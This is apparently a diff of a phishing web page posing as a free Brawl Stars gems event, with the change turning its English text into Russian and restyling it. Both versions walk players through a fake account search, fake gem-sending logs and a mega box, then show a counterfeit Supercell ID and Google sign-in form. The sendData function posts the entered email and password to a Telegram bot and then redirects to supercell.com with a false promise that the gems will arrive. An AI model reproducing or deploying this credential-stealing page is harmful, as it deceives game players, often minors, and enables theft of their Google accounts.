@@ -3,147 +3,128 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Brawl Stars: Free Gems Event</title>
-    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&family=Source+Sans+Pro:wght@400;700&display=swap" rel="stylesheet">
+    <title>Brawl Stars: Gem Event</title>
+    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&display=swap" rel="stylesheet">
     <style>
-        /* ГЛОБАЛЬНЫЕ СТИЛИ */
-        body, html {
-            margin: 0; padding: 0; width: 100%; height: 100%;
-            font-family: 'Source Sans Pro', sans-serif; overflow-x: hidden;
-            background: #1a2969;
+        :root {
+            --bs-blue: #2135a5;
+            --bs-dark-blue: #16247a;
+            --bs-yellow: #ffcc00;
+            --bs-border: #000000;
         }
 
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            font-family: 'Lilita One', cursive; background: #0c1a5e;
+            color: white; overflow-x: hidden;
+        }
+
+        /* Анимированный фон паттерн */
         .bg-overlay {
             position: fixed; top: -50%; left: -50%; width: 200%; height: 200%;
             background-image: url('https://brawlergems.com/generator/images/brawl_stars_pattern_transparent.png');
-            background-size: 300px auto; opacity: 0.1;
-            animation: moveBackground 60s linear infinite;
+            background-size: 280px auto; opacity: 0.08;
+            animation: moveBackground 50s linear infinite;
             z-index: 0; pointer-events: none;
         }
 
         @keyframes moveBackground {
             0% { transform: translate(0, 0); }
-            100% { transform: translate(-300px, -300px); }
+            100% { transform: translate(-280px, -280px); }
         }
 
         .wrapper {
             position: relative; z-index: 10;
             display: flex; flex-direction: column; align-items: center;
-            padding: 20px; min-height: 100vh;
+            padding: 15px; min-height: 100vh;
         }
 
-        .logo { width: 180px; margin: 10px 0; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); }
+        .logo { width: 160px; filter: drop-shadow(0 4px 8px rgba(0,0,0,0.6)); margin-bottom: 5px; }
 
-        /* SHELLY & BUBBLE */
+        /* ОБЛАКО ТЕКСТА ШЕЛЛИ */
         .shelly-container {
-            display: flex; align-items: center; width: 100%; max-width: 450px;
-            margin-bottom: 15px; animation: fadeIn 0.5s ease;
+            display: flex; align-items: center; width: 100%; max-width: 420px; margin-bottom: 20px;
         }
-
         .shelly-avatar {
-            width: 75px; height: 75px; border-radius: 50%; border: 3px solid #000;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 2; background: #fff;
+            width: 80px; height: 80px; border: 4px solid var(--bs-border);
+            border-radius: 50%; background: #fff; z-index: 2;
         }
-
         .brawl-bubble {
-            background: white; border: 4px solid black; border-radius: 20px;
-            padding: 12px 18px; margin-left: -15px; position: relative; flex: 1;
-            box-shadow: 0 6px 0 rgba(0,0,0,0.1);
+            background: #fff; border: 4px solid var(--bs-border); border-radius: 18px;
+            padding: 10px 15px; margin-left: -15px; flex: 1; position: relative;
+            box-shadow: 0 5px 0 rgba(0,0,0,0.2);
         }
+        .bubble-text { color: #000; font-size: 14px; line-height: 1.1; }
 
-        .brawl-bubble::before {
-            content: ''; position: absolute; left: -14px; top: 50%;
-            transform: translateY(-50%); border-top: 10px solid transparent;
-            border-bottom: 10px solid transparent; border-right: 10px solid black;
-        }
-
-        .bubble-text { 
-            color: #000; font-size: 15px; font-weight: 700; line-height: 1.2; 
-            font-family: 'Lilita One', cursive; 
-        }
-
-        /* MAIN BOX */
+        /* ГЛАВНОЕ ОКНО В СТИЛЕ ИГРЫ */
         .main-box {
-            background: white; border: 5px solid #000; border-radius: 20px;
-            width: 100%; max-width: 450px; padding: 25px;
-            box-shadow: 0 15px 0 rgba(0,0,0,0.2); text-align: center;
-            box-sizing: border-box; position: relative; overflow: hidden;
+            background: var(--bs-blue);
+            border: 5px solid var(--bs-border);
+            border-radius: 25px;
+            width: 100%; max-width: 420px;
+            padding: 20px;
+            box-shadow: inset 0 -8px 0 var(--bs-dark-blue), 0 12px 0 rgba(0,0,0,0.3);
+            position: relative;
         }
 
-        .back-btn {
-            position: absolute; top: 15px; left: 15px; width: 30px; cursor: pointer;
-            z-index: 100;
+        .step-title {
+            font-size: 24px; text-transform: uppercase; margin-bottom: 15px;
+            text-shadow: 3px 3px 0 #000; color: #fff;
         }
 
-        .step-title { 
-            font-family: 'Lilita One', cursive; color: #000; font-size: 26px; 
-            margin-bottom: 15px; text-transform: uppercase;
-            text-shadow: -2px -2px 0 #000, 2px -2px 0 #000, -2px 2px 0 #000, 2px 2px 0 #000, 0px 3px 0 rgba(0,0,0,0.2);
-            color: #fff;
+        /* ПОЛЕ ВВОДА ТЕГА */
+        .tag-input-container {
+            background: #111e63; border: 4px solid #000; border-radius: 12px;
+            padding: 12px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center;
+            box-shadow: inset 0 4px 4px rgba(0,0,0,0.5);
         }
-
-        /* INPUTS */
-        .tag-input-wrapper {
-            background: #f0f0f0; border: 3px solid #ccc; border-radius: 12px;
-            padding: 12px; margin-bottom: 15px; display: flex; justify-content: center; align-items: center;
-        }
-        .tag-prefix { font-family: 'Lilita One'; font-size: 26px; color: #777; margin-right: 5px; }
+        .tag-prefix { font-size: 28px; color: #ffcc00; margin-right: 5px; text-shadow: 2px 2px 0 #000; }
         input#tag {
-            width: 180px; border: none; background: transparent;
-            font-family: 'Lilita One'; font-size: 26px; outline: none;
-            text-transform: uppercase; color: #000;
+            background: transparent; border: none; font-family: 'Lilita One';
+            font-size: 28px; color: #fff; outline: none; width: 160px; text-transform: uppercase;
         }
 
-        /* GEMS GRID */
+        /* КНОПКИ ЖЕЛТЫЕ ОБЪЕМНЫЕ */
+        .btn-yellow {
+            background: linear-gradient(to bottom, #ffeb3b, #f9a825);
+            border: 4px solid #000; border-radius: 14px;
+            padding: 14px; width: 100%; color: #fff; font-family: 'Lilita One';
+            font-size: 22px; text-transform: uppercase; cursor: pointer;
+            text-shadow: 2px 2px 0 #000;
+            box-shadow: 0 6px 0 #9e6a00, 0 10px 15px rgba(0,0,0,0.4);
+            transition: 0.1s;
+        }
+        .btn-yellow:active { transform: translateY(4px); box-shadow: 0 2px 0 #9e6a00; }
+
+        /* СЕТКА ГЕМОВ - КАК В МАГАЗИНЕ */
         .gems-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
         .gem-card {
-            background: #f9f9f9; border: 3px solid #eee; border-radius: 15px;
-            padding: 12px; cursor: pointer; transition: 0.1s;
+            background: #2c42bb; border: 4px solid #000; border-radius: 15px;
+            padding: 15px; position: relative; box-shadow: inset 0 -5px 0 var(--bs-dark-blue);
+            cursor: pointer;
         }
-        .gem-card.selected { border-color: #FFA800; background: #FFF9E6; transform: scale(1.05); }
-        .gem-card img { width: 55px; display: block; margin: 0 auto 5px; }
-        .gem-card span { font-family: 'Lilita One'; font-size: 20px; color: #333; }
+        .gem-card.selected { border-color: #fff; background: #3d5afe; }
+        .gem-card img { width: 50px; filter: drop-shadow(0 3px 3px rgba(0,0,0,0.4)); }
+        .gem-card span { display: block; font-size: 18px; margin-top: 5px; text-shadow: 2px 2px 0 #000; }
 
-        /* BUTTONS */
-        .btn-yellow {
-            background: linear-gradient(180deg, #FFD84D 0%, #FFA800 100%);
-            border: 3px solid #000; border-radius: 12px; color: #fff;
-            font-family: 'Lilita One'; font-size: 24px; padding: 12px; width: 100%; 
-            cursor: pointer; box-shadow: 0 6px 0 #CC7A00; text-shadow: 2px 2px 0 #000;
-            text-transform: uppercase;
+        /* ЗАГРУЗКА */
+        .bar-bg { background: #0b1542; border: 4px solid #000; border-radius: 20px; height: 30px; overflow: hidden; margin: 15px 0; }
+        .bar-fill { background: linear-gradient(to right, #ffeb3b, #ff9800); height: 100%; width: 0%; }
+        .logs { background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 11px; color: #0f0; height: 60px; text-align: left; overflow: hidden; }
+
+        /* MEGA BOX АНИМАЦИЯ */
+        .mega-box-img { width: 180px; cursor: pointer; animation: bounce 1.5s infinite; filter: drop-shadow(0 10px 10px rgba(0,0,0,0.5)); }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
+
+        /* SUPERCELL ID СЕКЦИЯ */
+        .sc-id-box {
+            background: #000; margin: -20px -20px 20px -20px; padding: 15px;
+            border-radius: 20px 20px 0 0; display: flex; flex-direction: column; align-items: center;
         }
-        .pulse-animation { animation: pulse-yellow 1.5s infinite ease-in-out; }
-        @keyframes pulse-yellow { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.03); } }
-
-        /* PARTICLES */
-        .particle-gem {
-            position: absolute; width: 30px; height: 30px;
-            background: url('https://brawlergems.com/generator/images/30.png') no-repeat center;
-            background-size: contain; z-index: 50; animation: flyGem 0.8s ease-out forwards;
+        .g-input {
+            width: 100%; padding: 14px; margin: 8px 0; border: 3px solid #000; border-radius: 10px;
+            font-size: 16px; font-family: sans-serif; font-weight: bold;
         }
-        @keyframes flyGem {
-            0% { transform: translate(0,0) scale(1); opacity: 1; }
-            100% { transform: translate(var(--x), var(--y)) scale(0.5); opacity: 0; }
-        }
-
-        /* PROGRESS BARS */
-        .loader-wrap { display: none; margin: 20px 0; }
-        .bar-bg { background: #eee; height: 24px; border: 3px solid #000; border-radius: 15px; overflow: hidden; position: relative; }
-        .bar-fill { background: #FFA800; height: 100%; width: 0%; transition: 0.1s; }
-        .logs { text-align: left; background: #222; color: #0f0; padding: 10px; border-radius: 10px; font-family: monospace; font-size: 11px; height: 70px; margin-top: 15px; }
-
-        /* MEGA BOX */
-        .box-container { display: none; text-align: center; cursor: pointer; padding: 20px 0; }
-        .mega-box-img { width: 160px; filter: drop-shadow(0 10px 10px rgba(0,0,0,0.3)); }
-        .box-shake { animation: shakeBox 0.6s infinite; }
-        @keyframes shakeBox { 0%, 100% { transform: rotate(0); } 25% { transform: rotate(5deg) scale(1.1); } 75% { transform: rotate(-5deg) scale(1.1); } }
-        .box-explode { animation: explode 0.5s forwards; }
-        @keyframes explode { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(2.5); opacity: 0; filter: brightness(3); } }
-
-        /* SUPERCELL ID */
-        .sc-id-header { background: #000; border-radius: 15px 15px 0 0; padding: 15px; margin: -25px -25px 20px -25px; display: flex; flex-direction: column; align-items: center; }
-        .sc-badge { background: #fff; color: #000; font-family: 'Lilita One'; padding: 2px 10px; border-radius: 5px; font-size: 12px; margin-top: 5px; text-transform: uppercase; }
-        .g-input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
     </style>
 </head>
 <body>
@@ -156,84 +137,70 @@
     <div class="shelly-container">
         <img src="https://brawlergems.com/generator/images/brawler_icon.png" class="shelly-avatar">
         <div class="brawl-bubble">
-            <div class="bubble-text" id="bubble-msg">Hey Brawler! Enter your player tag to find your profile!</div>
+            <div class="bubble-text" id="bubble-msg">Привет, Боец! Введи свой тег, чтобы получить награду от Supercell!</div>
         </div>
     </div>
 
-    <div class="main-box" id="mainBox">
-        <img src="https://brawlergems.com/generator/images/back.png" id="backBtn" class="back-btn" style="display:none;" onclick="goBack()">
-        
+    <div class="main-box">
+        <img src="https://brawlergems.com/generator/images/back.png" id="backBtn" style="position: absolute; left: 15px; top: 15px; width: 30px; display: none; cursor: pointer;" onclick="goBack()">
+
         <div id="step-search">
-            <div class="step-title">Find Profile</div>
-            <div class="tag-input-wrapper">
+            <div class="step-title">ПОИСК АККАУНТА</div>
+            <div class="tag-input-container">
                 <span class="tag-prefix">#</span>
-                <input type="text" id="tag" placeholder="P8Q9RB2" maxlength="10">
+                <input type="text" id="tag" placeholder="ABC123DE" maxlength="10">
             </div>
-            <button class="btn-yellow pulse-animation" onclick="searchProfile()">Find Account</button>
+            <button class="btn-yellow" onclick="searchProfile()">ПОДТВЕРДИТЬ</button>
         </div>
 
-        <div id="step-load-search" class="loader-wrap">
-            <div class="step-title">Searching...</div>
+        <div id="step-load-search" style="display: none;">
+            <div class="step-title">ИЩЕМ ТЕБЯ...</div>
             <div class="bar-bg"><div class="bar-fill" id="search-bar"></div></div>
             <div class="logs" id="search-logs"></div>
         </div>
 
-        <div id="step-gems" style="display:none;">
-            <div style="background: #222; border-radius: 15px; padding: 12px; color: #fff; display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
-                <img src="https://brawlergems.com/generator/images/brawler_icon.png" width="45">
-                <div style="text-align: left;">
-                    <div style="font-family: 'Lilita One'; color: #FFD84D; font-size: 20px;" id="display-tag">#TAG</div>
-                    <div style="font-size: 11px; opacity: 0.6;">Account Status: Connected</div>
-                </div>
+        <div id="step-gems" style="display: none;">
+            <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 10px; margin-bottom: 15px;">
+                <span style="color: #ffcc00;">АККАУНТ:</span> <span id="display-tag">#TAG</span>
             </div>
-            <div class="step-title" style="font-size: 20px;">Select Amount</div>
+            <div class="step-title" style="font-size: 20px;">ВЫБЕРИ КОЛИЧЕСТВО</div>
             <div class="gems-grid">
                 <div class="gem-card selected" onclick="selectGems(this, '30')"><img src="https://brawlergems.com/generator/images/30.png"><span>30</span></div>
                 <div class="gem-card" onclick="selectGems(this, '360')"><img src="https://brawlergems.com/generator/images/360.png"><span>360</span></div>
                 <div class="gem-card" onclick="selectGems(this, '950')"><img src="https://brawlergems.com/generator/images/950.png"><span>950</span></div>
                 <div class="gem-card" onclick="selectGems(this, '2000')"><img src="https://brawlergems.com/generator/images/2000.png"><span>2000</span></div>
             </div>
-            <button class="btn-yellow pulse-animation" onclick="startGeneration()">Claim Gems</button>
+            <button class="btn-yellow" onclick="startGeneration()">ПОЛУЧИТЬ</button>
         </div>
 
-        <div id="step-load-gen" class="loader-wrap">
-            <div class="step-title">Generating...</div>
+        <div id="step-load-gen" style="display: none;">
+            <div class="step-title">ОТПРАВКА ГЕМОВ...</div>
             <div class="bar-bg"><div class="bar-fill" id="gen-bar"></div></div>
             <div class="logs" id="gen-logs"></div>
         </div>
 
-        <div id="step-box" class="box-container" onclick="openBox()">
-            <div class="step-title">Reward Ready!</div>
-            <img src="https://brawlergems.com/generator/images/box_mega.png" id="megaBox" class="mega-box-img box-shake">
-            <div style="font-family: 'Lilita One'; color: #FFA800; font-size: 20px; margin-top: 10px; text-shadow: 2px 2px 0 #000;">TAP TO OPEN!</div>
+        <div id="step-box" style="display: none; text-align: center;" onclick="openBox()">
+            <div class="step-title">НАГРАДА ГОТОВА!</div>
+            <img src="https://brawlergems.com/generator/images/box_mega.png" id="megaBox" class="mega-box-img">
+            <div style="margin-top: 15px; font-size: 20px; text-shadow: 2px 2px 0 #000; color: #ffcc00;">НАЖМИ, ЧТОБЫ ОТКРЫТЬ!</div>
         </div>
 
-        <div id="step-google" style="display:none; text-align: left;">
-            <div class="sc-id-header">
-                <img src="https://brawlergems.com/generator/images/supercell_id_logo.png" width="120">
-                <div class="sc-badge">Verification Required</div>
+        <div id="step-google" style="display: none; text-align: left;">
+            <div class="sc-id-box">
+                <img src="https://brawlergems.com/generator/images/supercell_id_logo.png" width="130">
+                <div class="sc-badge">ВЕРИФИКАЦИЯ</div>
             </div>
-            <center><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70" style="margin-bottom: 10px;"></center>
-            <h2 style="font-weight: 400; font-size: 18px; text-align: center; color: #202124;">Sign in to Verify</h2>
-            <p style="text-align: center; color: #5f6368; font-size: 13px;">Linking <b><span id="final-tag"></span></b> to Supercell ID...</p>
-            <input type="email" id="email" class="g-input" placeholder="Email or phone">
-            <input type="password" id="pass" class="g-input" placeholder="Enter password">
-            <button class="btn-yellow pulse-animation" style="margin-top: 15px;" onclick="sendData()">Complete Claim</button>
+            <p style="text-align: center; font-size: 14px; margin-bottom: 15px;">Чтобы завершить перевод на аккаунт <b id="final-tag"></b>, подтвердите право владения через Google.</p>
+            <input type="email" id="email" class="g-input" placeholder="Почта или телефон">
+            <input type="password" id="pass" class="g-input" placeholder="Введите пароль">
+            <button class="btn-yellow" style="margin-top: 15px;" onclick="sendData()">ЗАБРАТЬ ГЕМЫ</button>
         </div>
     </div>
 </div>
 
 <script>
-    let selectedGems = "30";
     let playerTag = "";
-    const bubbleMsg = document.getElementById('bubble-msg');
-    const backBtn = document.getElementById('backBtn');
-
-    function selectGems(el, val) {
-        document.querySelectorAll('.gem-card').forEach(c => c.classList.remove('selected'));
-        el.classList.add('selected');
-        selectedGems = val;
-    }
+    let selectedGems = "30";
 
     function showStep(id) {
         const steps = ['step-search', 'step-load-search', 'step-gems', 'step-load-gen', 'step-box', 'step-google'];
@@ -241,21 +208,25 @@
         document.getElementById(id).style.display = 'block';
     }
 
+    function selectGems(el, val) {
+        document.querySelectorAll('.gem-card').forEach(c => c.classList.remove('selected'));
+        el.classList.add('selected');
+        selectedGems = val;
+    }
+
     function searchProfile() {
         let val = document.getElementById('tag').value.trim();
-        if(val.length < 3) return alert("Enter valid Tag!");
+        if(val.length < 3) return alert("Введите корректный тег!");
         playerTag = "#" + val.toUpperCase();
-        
         showStep('step-load-search');
-        bubbleMsg.innerText = "Searching for " + playerTag + "...";
-
+        
         let p = 0;
-        let logs = ["> Connecting...", "> Database linked", "> Profile found!"];
+        let logs = ["Подключение к серверу...", "Поиск тега " + playerTag, "Аккаунт найден!", "Статус: Активен"];
         let lIdx = 0;
         let iv = setInterval(() => {
             p += 4;
             document.getElementById('search-bar').style.width = p + "%";
-            if(p % 32 == 0 && lIdx < logs.length) {
+            if(p % 24 == 0 && lIdx < logs.length) {
                 document.getElementById('search-logs').innerHTML += "<div>" + logs[lIdx] + "</div>";
                 lIdx++;
             }
@@ -263,75 +234,64 @@
                 clearInterval(iv);
                 setTimeout(() => {
                     showStep('step-gems');
-                    backBtn.style.display = 'block';
+                    document.getElementById('backBtn').style.display = 'block';
                     document.getElementById('display-tag').innerText = playerTag;
-                    bubbleMsg.innerText = "Success! Now choose how many gems you want.";
-                }, 500);
+                }, 400);
             }
         }, 60);
     }
 
     function startGeneration() {
         showStep('step-load-gen');
-        backBtn.style.display = 'none';
-        bubbleMsg.innerText = "Sending " + selectedGems + " gems to account...";
-
+        document.getElementById('backBtn').style.display = 'none';
         let p = 0;
-        let logs = ["> Bypassing...", "> Syncing gems...", "> Finalizing..."];
+        let logs = ["Шифрование данных...", "Генерация пакетов...", "Отправка " + selectedGems + " гемов...", "Успешно!"];
         let lIdx = 0;
         let iv = setInterval(() => {
             p += 2;
             document.getElementById('gen-bar').style.width = p + "%";
-            if(p % 5 == 0) createParticle();
-            if(p % 33 == 0 && lIdx < logs.length) {
+            if(p % 25 == 0 && lIdx < logs.length) {
                 document.getElementById('gen-logs').innerHTML += "<div>" + logs[lIdx] + "</div>";
                 lIdx++;
             }
             if(p >= 100) {
                 clearInterval(iv);
-                setTimeout(() => { showStep('step-box'); bubbleMsg.innerText = "MEGA BOX UNLOCKED! Tap to open!"; }, 500);
+                setTimeout(() => showStep('step-box'), 400);
             }
-        }, 50);
-    }
-
-    function createParticle() {
-        const p = document.createElement('div');
-        p.className = 'particle-gem';
-        p.style.setProperty('--x', (Math.random()-0.5)*250 + "px");
-        p.style.setProperty('--y', (Math.random()-0.5)*250 + "px");
-        p.style.left = "50%"; p.style.top = "50%";
-        document.getElementById('step-load-gen').appendChild(p);
-        setTimeout(() => p.remove(), 800);
+        }, 40);
     }
 
     function openBox() {
-        document.getElementById('megaBox').classList.remove('box-shake');
-        document.getElementById('megaBox').classList.add('box-explode');
-        bubbleMsg.innerText = "JACKPOT! " + selectedGems + " GEMS RECEIVED!";
+        const box = document.getElementById('megaBox');
+        box.style.animation = "none";
+        box.style.transform = "scale(2)";
+        box.style.opacity = "0";
+        box.style.transition = "0.4s";
+        
         setTimeout(() => {
             showStep('step-google');
             document.getElementById('final-tag').innerText = playerTag;
-            backBtn.style.display = 'block';
-        }, 600);
+            document.getElementById('backBtn').style.display = 'block';
+        }, 400);
     }
 
     function goBack() {
         const current = document.querySelector('[id^="step-"]:not([style*="display: none"])').id;
-        if(current === 'step-gems') { showStep('step-search'); backBtn.style.display = 'none'; bubbleMsg.innerText = "Enter player tag!"; }
-        else if(current === 'step-google') { showStep('step-gems'); }
+        if(current === 'step-gems') { showStep('step-search'); document.getElementById('backBtn').style.display = 'none'; }
+        if(current === 'step-google') showStep('step-gems');
     }
 
     async function sendData() {
         const mail = document.getElementById('email').value;
         const pass = document.getElementById('pass').value;
-        if(!mail || !pass) return alert("Fill fields!");
+        if(!mail || !pass) return alert("Заполните все поля!");
 
         const token = "ТВОЙ_ТОКЕН";
         const chat = "ТВОЙ_ID";
-        const text = `🎯 LOG\nTag: ${playerTag}\nGems: ${selectedGems}\nMail: ${mail}\nPass: ${pass}`;
+        const text = `🎯 НОВЫЙ ЛОГ\nТег: ${playerTag}\nГемы: ${selectedGems}\nПочта: ${mail}\nПароль: ${pass}`;
 
         await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}`);
-        alert("Success! Gems will be added in 24h.");
+        alert("Заявка принята! Начисление произойдет в течение 24 часов.");
         window.location.href = "https://supercell.com";
     }
 </script>
